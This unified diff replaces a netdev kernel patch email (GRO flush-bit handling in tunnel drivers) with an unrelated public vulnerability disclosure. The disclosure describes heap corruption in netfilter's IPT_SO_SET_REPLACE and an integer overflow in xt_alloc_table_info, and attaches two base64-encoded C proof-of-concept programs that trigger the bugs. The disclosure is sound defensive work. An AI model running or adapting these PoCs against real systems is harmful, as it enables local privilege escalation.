@@ -1,136 +1,133 @@
-From: Alexander Duyck <aduyck@mirantis.com>
-Subject: [net-next PATCH v2 1/2] gro: Defer clearing of flush bit in tunnel
- paths
-Date: Wed, 09 Mar 2016 09:24:23 -0800
-Message-ID: <20160309172254.11477.43113.stgit@localhost.localdomain>
-References: <20160309171924.11477.93179.stgit@localhost.localdomain>
+From: Ben Hawkes <hawkes@google.com>
+Subject: Linux netfilter IPT_SO_SET_REPLACE memory corruption
+Date: Wed, 9 Mar 2016 09:25:05 -0800
+Message-ID: <CABWXx8H08vO+jXQgMCJ5xRukza0o1HA_VVfshsrgy2wBY8toCg@mail.gmail.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 7bit
-To: netdev@vger.kernel.org, davem@davemloft.net
+Content-Type: multipart/mixed; boundary=94eb2c07d0fa92fa36052da0fa8f
+To: netdev@vger.kernel.org
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-pa0-f43.google.com ([209.85.220.43]:32821 "EHLO
-	mail-pa0-f43.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1753273AbcCIRYZ (ORCPT
-	<rfc822;netdev@vger.kernel.org>); Wed, 9 Mar 2016 12:24:25 -0500
-Received: by mail-pa0-f43.google.com with SMTP id fl4so44572988pad.0
-        for <netdev@vger.kernel.org>; Wed, 09 Mar 2016 09:24:25 -0800 (PST)
-In-Reply-To: <20160309171924.11477.93179.stgit@localhost.localdomain>
+Received: from mail-yw0-f180.google.com ([209.85.161.180]:36163 "EHLO
+	mail-yw0-f180.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1753273AbcCIRZH (ORCPT
+	<rfc822;netdev@vger.kernel.org>); Wed, 9 Mar 2016 12:25:07 -0500
+Received: by mail-yw0-f180.google.com with SMTP id g3so45549296ywa.3
+        for <netdev@vger.kernel.org>; Wed, 09 Mar 2016 09:25:06 -0800 (PST)
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-This patch updates the GRO handlers for GRE, VXLAN, GENEVE, and FOU so that
-we do not clear the flush bit until after we have called the next level GRO
-handler.  Previously this was being cleared before parsing through the list
-of frames, however this resulted in several paths where either the bit
-needed to be reset but wasn't as in the case of FOU, or cases where it was
-being set as in GENEVE.  By just deferring the clearing of the bit until
-after the next level protocol has been parsed we can avoid any unnecessary
-bit twiddling and avoid bugs.
+--94eb2c07d0fa92fa36052da0fa8f
+Content-Type: text/plain; charset=UTF-8
 
-Signed-off-by: Alexander Duyck <aduyck@mirantis.com>
----
+N.B. I was redirected to this list by security@kernel.org. I'm told
+that networking related issues such as this are handled on the public
+netdev mailing list.
 
-v2: This was originally code for checking the flush_id in tunnels but since
-    that was rejected I thought it best to at least submit the bit that can
-    fix actual issues in the code.
+A memory corruption vulnerability exists in the IPT_SO_SET_REPLACE
+ioctl in the netfilter code for iptables support. This ioctl is can be
+triggered by an unprivileged user on PF_INET sockets when unprivileged
+user namespaces are available (CONFIG_USER_NS=y). Android does not
+enable this option, but desktop/server distributions and Chrome OS
+will commonly enable this to allow for containers support or
+sandboxing.
 
- drivers/net/geneve.c   |    7 ++-----
- drivers/net/vxlan.c    |    3 +--
- net/ipv4/fou.c         |    3 +--
- net/ipv4/gre_offload.c |    3 +--
- 4 files changed, 5 insertions(+), 11 deletions(-)
+In the mark_source_chains function (net/ipv4/netfilter/ip_tables.c) it
+is possible for a user-supplied ipt_entry structure to have a large
+next_offset field. This field is not bounds checked prior to writing a
+counter value at the supplied offset:
 
-diff --git a/drivers/net/geneve.c b/drivers/net/geneve.c
-index 6a0cbbe03e5d..aebb4a9289c1 100644
---- a/drivers/net/geneve.c
-+++ b/drivers/net/geneve.c
-@@ -462,8 +462,6 @@ static struct sk_buff **geneve_gro_receive(struct sk_buff **head,
- 			goto out;
- 	}
- 
--	flush = 0;
--
- 	for (p = *head; p; p = p->next) {
- 		if (!NAPI_GRO_CB(p)->same_flow)
- 			continue;
-@@ -480,14 +478,13 @@ static struct sk_buff **geneve_gro_receive(struct sk_buff **head,
- 
- 	rcu_read_lock();
- 	ptype = gro_find_receive_by_type(type);
--	if (!ptype) {
--		flush = 1;
-+	if (!ptype)
- 		goto out_unlock;
--	}
- 
- 	skb_gro_pull(skb, gh_len);
- 	skb_gro_postpull_rcsum(skb, gh, gh_len);
- 	pp = ptype->callbacks.gro_receive(head, skb);
-+	flush = 0;
- 
- out_unlock:
- 	rcu_read_unlock();
-diff --git a/drivers/net/vxlan.c b/drivers/net/vxlan.c
-index 2399099e68cf..63929877619f 100644
---- a/drivers/net/vxlan.c
-+++ b/drivers/net/vxlan.c
-@@ -591,8 +591,6 @@ static struct sk_buff **vxlan_gro_receive(struct sk_buff **head,
- 
- 	skb_gro_pull(skb, sizeof(struct vxlanhdr)); /* pull vxlan header */
- 
--	flush = 0;
--
- 	for (p = *head; p; p = p->next) {
- 		if (!NAPI_GRO_CB(p)->same_flow)
- 			continue;
-@@ -606,6 +604,7 @@ static struct sk_buff **vxlan_gro_receive(struct sk_buff **head,
- 	}
- 
- 	pp = eth_gro_receive(head, skb);
-+	flush = 0;
- 
- out:
- 	skb_gro_remcsum_cleanup(skb, &grc);
-diff --git a/net/ipv4/fou.c b/net/ipv4/fou.c
-index 88dab0c1670c..780484243e14 100644
---- a/net/ipv4/fou.c
-+++ b/net/ipv4/fou.c
-@@ -319,8 +319,6 @@ static struct sk_buff **gue_gro_receive(struct sk_buff **head,
- 
- 	skb_gro_pull(skb, hdrlen);
- 
--	flush = 0;
--
- 	for (p = *head; p; p = p->next) {
- 		const struct guehdr *guehdr2;
- 
-@@ -352,6 +350,7 @@ static struct sk_buff **gue_gro_receive(struct sk_buff **head,
- 		goto out_unlock;
- 
- 	pp = ops->callbacks.gro_receive(head, skb);
-+	flush = 0;
- 
- out_unlock:
- 	rcu_read_unlock();
-diff --git a/net/ipv4/gre_offload.c b/net/ipv4/gre_offload.c
-index 47f4c544c916..540866dbd27d 100644
---- a/net/ipv4/gre_offload.c
-+++ b/net/ipv4/gre_offload.c
-@@ -175,8 +175,6 @@ static struct sk_buff **gre_gro_receive(struct sk_buff **head,
- 					     null_compute_pseudo);
- 	}
- 
--	flush = 0;
--
- 	for (p = *head; p; p = p->next) {
- 		const struct gre_base_hdr *greh2;
- 
-@@ -213,6 +211,7 @@ static struct sk_buff **gre_gro_receive(struct sk_buff **head,
- 	skb_gro_postpull_rcsum(skb, greh, grehlen);
- 
- 	pp = ptype->callbacks.gro_receive(head, skb);
-+	flush = 0;
- 
- out_unlock:
- 	rcu_read_unlock();
+newpos = pos + e->next_offset;
+...
+e = (struct ipt_entry *) (entry0 + newpos);
+e->counters.pcnt = pos;
+
+This means that an out of bounds 32-bit write can occur in a 64kb
+range from the allocated heap entry, with a controlled offset and a
+partially controlled write value ("pos") or zero. The attached
+proof-of-concept (netfilter_setsockopt_v3.c) triggers the corruption
+multiple times to set adjacent heap structures to zero.
+
+This issue affects (at least) kernel versions 3.10, 3.18 and 4.4, and
+could be used for local privilege escalation. It appears that a
+similar codepath is accessible via arp_tables.c/ARPT_SO_SET_REPLACE as
+well.
+
+Furthermore, a recent refactoring of this codepath
+(https://github.com/torvalds/linux/commit/2e4e6a17af35be359cc8f1c924f8f198fbd478cc)
+introduced an integer overflow in xt_alloc_table_info, which on 32-bit
+systems can lead to small structure allocation and a copy_from_user
+based heap corruption. The attached proof-of-concept
+(netfilter_setsockopt_v4.c) triggers this issue on 4.4.
+
+--94eb2c07d0fa92fa36052da0fa8f
+Content-Type: text/x-csrc; charset=US-ASCII; name="netfilter_setsockopt_v3.c"
+Content-Disposition: attachment; filename="netfilter_setsockopt_v3.c"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_ill44i490
+
+I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5o
+PgojaW5jbHVkZSA8c2NoZWQuaD4KI2luY2x1ZGUgPGxpbnV4L3NjaGVkLmg+CiNpbmNsdWRlIDxl
+cnJuby5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNp
+bmNsdWRlIDxsaW51eC9uZXRsaW5rLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPHN5
+cy9wdHJhY2UuaD4KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4KI2luY2x1ZGUgPG5ldC9pZi5oPgoj
+aW5jbHVkZSA8bGludXgvbmV0ZmlsdGVyX2lwdjQvaXBfdGFibGVzLmg+CiNpbmNsdWRlIDxmY250
+bC5oPgoKaW50IG5ldGZpbHRlcl9zZXRzb2Nrb3B0KHZvaWQgKnApIHsKCWludCBzb2NrLCBvcHRs
+ZW47CglpbnQgcmV0OwoJdm9pZCAqZGF0YTsKCXNpemVfdCBzaXplOwoJc3RydWN0IGlwdF9yZXBs
+YWNlICpyZXBsOwoJc3RydWN0IGlwdF9lbnRyeSAqZW50cnk7CglzdHJ1Y3QgeHRfc3RhbmRhcmRf
+dGFyZ2V0ICp0YXJnZXQ7CglpbnQgeDsKCglmb3IgKHggPSAwOyB4IDwgNjU1MzY7IHgrKykgewoK
+CQlzb2NrID0gc29ja2V0KFBGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX1JBVyk7CgoJCWlmIChz
+b2NrID09IC0xKSB7CgkJICAgICAgICBwZXJyb3IoInNvY2tldCIpOwoJCSAgICAgICAgcmV0dXJu
+IC0xOwoJCX0KCgkJc2l6ZSA9IHNpemVvZihzdHJ1Y3QgaXB0X3JlcGxhY2UpICsgc2l6ZW9mKHN0
+cnVjdCBpcHRfZW50cnkpICsgc2l6ZW9mKHN0cnVjdCB4dF9zdGFuZGFyZF90YXJnZXQpICsgNDsK
+CgkJZGF0YSA9IG1hbGxvYyhzaXplKTsKCgkJaWYgKGRhdGEgPT0gTlVMTCkgewoJCQlwZXJyb3Io
+Im1hbGxvYyIpOwoJCQlyZXR1cm4gLTE7CgkJfQoKCQltZW1zZXQoZGF0YSwgMCwgc2l6ZSk7CgoJ
+CXJlcGwgPSAoc3RydWN0IGlwdF9yZXBsYWNlICopIGRhdGE7CgkJZW50cnkgPSAoc3RydWN0IGlw
+dF9lbnRyeSAqKSAoZGF0YSArIHNpemVvZihzdHJ1Y3QgaXB0X3JlcGxhY2UpKTsKCQl0YXJnZXQg
+PSAoc3RydWN0IHh0X3N0YW5kYXJkX3RhcmdldCAqKSAoZGF0YSArIHNpemVvZihzdHJ1Y3QgaXB0
+X3JlcGxhY2UpICsgc2l6ZW9mKHN0cnVjdCBpcHRfZW50cnkpICsgNCk7CgoJCXByaW50ZigicmVw
+bCAlcCAoJWx4KSBlbnRyeSAlcCAoJWx4KSB0YXJnZXQgJXBcbiIsIHJlcGwsIHNpemVvZihzdHJ1
+Y3QgaXB0X3JlcGxhY2UpLCBlbnRyeSwgc2l6ZW9mKHN0cnVjdCBpcHRfZW50cnkpLCB0YXJnZXQp
+OwoKCQlyZXBsLT5udW1fY291bnRlcnMgPSAweDE7CgkJcmVwbC0+c2l6ZSA9IHNpemVvZihzdHJ1
+Y3QgaXB0X2VudHJ5KSArIHNpemVvZihzdHJ1Y3QgeHRfc3RhbmRhcmRfdGFyZ2V0KTsKCQlyZXBs
+LT52YWxpZF9ob29rcyA9IDB4MTsKCQlyZXBsLT5udW1fZW50cmllcyA9IDB4MTsKCgkJbWVtc2V0
+KCZyZXBsLT51bmRlcmZsb3csIDEsIHNpemVvZihyZXBsLT51bmRlcmZsb3cpKTsKCQlyZXBsLT51
+bmRlcmZsb3dbMF0gPSAwOwoKCQllbnRyeS0+bmV4dF9vZmZzZXQgPSB4OwoJCWVudHJ5LT50YXJn
+ZXRfb2Zmc2V0ID0gc2l6ZW9mKHN0cnVjdCBpcHRfZW50cnkpICsgNDsKCgkJdGFyZ2V0LT52ZXJk
+aWN0ID0gLShORl9BQ0NFUFQgKyAxKTsKCgkJcmV0ID0gc2V0c29ja29wdChzb2NrLCBTT0xfSVAs
+IElQVF9TT19TRVRfUkVQTEFDRSwgKHZvaWQgKikgZGF0YSwgc2l6ZSk7CgoJCWNsb3NlKHNvY2sp
+OwoJCWZyZWUoZGF0YSk7CgoJCXByaW50ZigiZG9uZSAlZCA9PiAlZFxuIiwgeCwgcmV0KTsKCX0K
+CglyZXR1cm4gMDsKfQoKaW50IG1haW4odm9pZCkgewoJdm9pZCAqc3RhY2s7CglpbnQgcmV0OwoK
+CXJldCA9IHVuc2hhcmUoQ0xPTkVfTkVXVVNFUik7CgoJaWYgKHJldCA9PSAtMSkgewoJCXBlcnJv
+cigidW5zaGFyZSIpOwoJCXJldHVybiAtMTsKCX0KCglzdGFjayA9ICh2b2lkICopIG1hbGxvYyg2
+NTUzNik7CgoJaWYgKHN0YWNrID09IE5VTEwpIHsKCQlwZXJyb3IoIm1hbGxvYyIpOwoJCXJldHVy
+biAtMTsKCX0KCgljbG9uZShuZXRmaWx0ZXJfc2V0c29ja29wdCwgc3RhY2sgKyA2NTUzNiwgQ0xP
+TkVfTkVXTkVULCBOVUxMKTsKCglzbGVlcCgxKTsKCglyZXR1cm4gMDsKfQo=
+--94eb2c07d0fa92fa36052da0fa8f
+Content-Type: text/x-csrc; charset=US-ASCII; name="netfilter_setsockopt_v4.c"
+Content-Disposition: attachment; filename="netfilter_setsockopt_v4.c"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_ill44i551
+
+I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5o
+PgojaW5jbHVkZSA8c2NoZWQuaD4KI2luY2x1ZGUgPGxpbnV4L3NjaGVkLmg+CiNpbmNsdWRlIDxl
+cnJuby5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNp
+bmNsdWRlIDxsaW51eC9uZXRsaW5rLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPHN5
+cy9wdHJhY2UuaD4KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4KI2luY2x1ZGUgPG5ldC9pZi5oPgoj
+aW5jbHVkZSA8bGludXgvbmV0ZmlsdGVyX2lwdjQvaXBfdGFibGVzLmg+CiNpbmNsdWRlIDxmY250
+bC5oPgoKaW50IG5ldGZpbHRlcl9zZXRzb2Nrb3B0KHZvaWQgKnApIHsKCWludCBzb2NrOwoJaW50
+IHJldDsKCXZvaWQgKmRhdGE7CglzaXplX3Qgc2l6ZTsKCXN0cnVjdCBpcHRfcmVwbGFjZSAqcmVw
+bDsKCglzb2NrID0gc29ja2V0KFBGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX1JBVyk7CgoJaWYg
+KHNvY2sgPT0gLTEpIHsKCSAgICAgICAgcGVycm9yKCJzb2NrZXQiKTsKCSAgICAgICAgcmV0dXJu
+IC0xOwoJfQoKCXNpemUgPSBzaXplb2Yoc3RydWN0IGlwdF9yZXBsYWNlKTsKCglkYXRhID0gbWFs
+bG9jKHNpemUpOwoKCWlmIChkYXRhID09IE5VTEwpIHsKCQlwZXJyb3IoIm1hbGxvYyIpOwoJCXJl
+dHVybiAtMTsKCX0KCgltZW1zZXQoZGF0YSwgMCwgc2l6ZSk7CgoJcmVwbCA9IChzdHJ1Y3QgaXB0
+X3JlcGxhY2UgKikgZGF0YTsKCglyZXBsLT5udW1fY291bnRlcnMgPSAweDE7CglyZXBsLT5zaXpl
+ID0gMHhmZmZmZmZmZjsKCXJlcGwtPnZhbGlkX2hvb2tzID0gMHgxOwoJcmVwbC0+bnVtX2VudHJp
+ZXMgPSAweDE7CgoJcmV0ID0gc2V0c29ja29wdChzb2NrLCBTT0xfSVAsIElQVF9TT19TRVRfUkVQ
+TEFDRSwgKHZvaWQgKikgZGF0YSwgc2l6ZSk7CgoJcHJpbnRmKCJkb25lICVkXG4iLCByZXQpOwoK
+CXJldHVybiAwOwp9CgppbnQgbWFpbih2b2lkKSB7Cgl2b2lkICpzdGFjazsKCWludCByZXQ7CgoJ
+cmV0ID0gdW5zaGFyZShDTE9ORV9ORVdVU0VSKTsKCglpZiAocmV0ID09IC0xKSB7CgkJcGVycm9y
+KCJ1bnNoYXJlIik7CgkJcmV0dXJuIC0xOwoJfQoKCXN0YWNrID0gKHZvaWQgKikgbWFsbG9jKDY1
+NTM2KTsKCglpZiAoc3RhY2sgPT0gTlVMTCkgewoJCXBlcnJvcigibWFsbG9jIik7CgkJcmV0dXJu
+IC0xOwoJfQoKCWNsb25lKG5ldGZpbHRlcl9zZXRzb2Nrb3B0LCBzdGFjayArIDY1NTM2LCBDTE9O
+RV9ORVdORVQsIE5VTEwpOwoKCXNsZWVwKDEpOwoKCXJldHVybiAwOwp9Cg==
+--94eb2c07d0fa92fa36052da0fa8f--
